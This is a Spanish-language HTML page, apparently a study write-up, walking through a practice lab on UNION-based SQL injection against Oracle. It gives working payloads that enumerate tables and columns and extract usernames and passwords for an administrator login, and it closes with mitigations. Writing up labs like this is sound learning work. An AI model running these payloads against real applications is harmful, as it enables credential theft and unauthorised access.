@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 6 - SQL Injection Listing DB Contents (Oracle)</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 6</h2>
+<p>SQL Injection attack, listing the database contents on Oracle</p>
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+
+<p><strong>Tipo de SQLi:</strong> UNION-based SQL Injection en Oracle</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Enumerar el contenido de la base de datos Oracle para identificar
+la tabla que contiene credenciales de usuarios y extraer
+username y password para iniciar sesión como administrador.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad</h3>
+
+<p>
+La aplicación no valida el parámetro <strong>category</strong>,
+permitiendo inyección de consultas SQL adicionales mediante
+<strong>UNION SELECT</strong>.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1 – Seleccionar categoría</strong></p>
+
+<p>
+Se navegó a la categoría <strong>Lifestyle</strong> y se interceptó la petición.
+</p>
+
+
+<p><strong>Paso 2 – Confirmar número de columnas</strong></p>
+
+<pre>
+' UNION SELECT 'abc','def' FROM dual--
+</pre>
+
+<p>
+Los valores "abc" y "def" aparecieron como productos,
+confirmando 2 columnas compatibles con UNION.
+</p>
+
+
+<p><strong>Paso 3 – Enumerar tablas</strong></p>
+
+<pre>
+' UNION SELECT table_name, NULL FROM all_tables--
+</pre>
+
+<p>
+Se identificó la tabla de usuarios:
+<strong>USERS_LRTWKH</strong>
+</p>
+
+
+<p><strong>Paso 4 – Enumerar columnas</strong></p>
+
+<pre>
+' UNION SELECT column_name, NULL 
+FROM all_tab_columns 
+WHERE table_name='USERS_LRTWKH'--
+</pre>
+
+<p>
+Columnas relevantes identificadas:
+</p>
+
+<ul>
+<li>USERNAME_ZOWHGC</li>
+<li>PASSWORD_QUEGN</li>
+</ul>
+
+
+<p><strong>Paso 5 – Extraer credenciales</strong></p>
+
+<pre>
+' UNION SELECT USERNAME_ZOWHGC, PASSWORD_QUEGN FROM USERS_LRTWKH--
+</pre>
+
+<p>
+Se extrajo la lista completa de usuarios incluyendo
+el registro del usuario <strong>administrator</strong>.
+</p>
+
+
+<p><strong>Paso 6 – Login</strong></p>
+
+<p>
+Se ingresó a <strong>My Account</strong> utilizando las credenciales
+extraídas para resolver el laboratorio.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-code"></i> Explicación del payload</h3>
+
+<pre>
+' UNION SELECT [columna1], [columna2] FROM [tabla]--
+</pre>
+
+<ul>
+
+<li>' → cierra la cadena del WHERE original</li>
+
+<li>UNION SELECT → combina resultados adicionales</li>
+
+<li>NULL → relleno para mantener número de columnas</li>
+
+<li>-- → comenta el resto de la consulta</li>
+
+</ul>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Consultas parametrizadas.</li>
+
+<li>Validación estricta de entradas.</li>
+
+<li>Principio de mínimo privilegio.</li>
+
+<li>Uso de ORMs seguros.</li>
+
+<li>Implementación de WAF.</li>
+
+<li>Almacenamiento seguro de contraseñas (bcrypt, Argon2).</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+</div>
+
+</section>
+
+</body>
+</html>
